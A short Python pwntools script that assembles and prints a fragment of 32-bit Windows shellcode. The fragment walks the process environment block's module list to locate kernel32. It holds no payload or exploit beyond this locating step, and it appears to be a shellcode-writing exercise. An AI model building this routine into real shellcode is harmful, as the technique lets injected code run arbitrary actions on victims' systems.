#!/usr/bin/env python3

from pwn import *


shellcode = asm('''
start:
    mov ebp, esp
    sub sp, 0x60

get_init_order_module_list:
    xor ecx, ecx
    mov esi, fs:[ecx+0x30]
    mov esi, [esi+0x0c]
    mov esi, [esi+0x1c]

check_module:
    mov ebx, [esi+0x08]
    mov edi, [esi+0x20]
    mov esi, [esi]
    cmp [edi+0x18], cx
    jne check_module
''')

print(f'\n{disasm(shellcode)}')
print(f'\n  shellcode = {shellcode}\n')
